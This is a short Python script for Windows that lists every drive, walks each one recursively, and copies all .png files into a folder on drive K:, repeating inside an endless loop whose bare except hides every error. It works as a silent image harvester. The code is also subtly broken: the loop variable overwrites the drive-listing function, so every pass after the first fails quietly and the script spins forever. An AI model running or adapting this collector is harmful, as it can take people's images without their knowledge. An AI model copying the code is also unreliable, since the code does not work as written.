import os
import time
from ctypes import windll
import string
import shutil

def disk():

    bitmask = windll.kernel32.GetLogicalDrives()

    disks = list()

    for harf in string.ascii_uppercase:
        if bitmask & 1:
            disks.append(harf)

        bitmask >>= 1
    return disks

if not os.path.exists(f"K:/haf"):
    os.mkdir(f"K:/haf")

while True:
    try:

        for disk in disk():
            for ky, ki, di in os.walk(disk+":/"):
                for x in di:
                    if x.endswith('.png'):
                        shutil.copy(ky+'/'+x, f"K:/haf")
        
        print('finished')
    except:
        pass


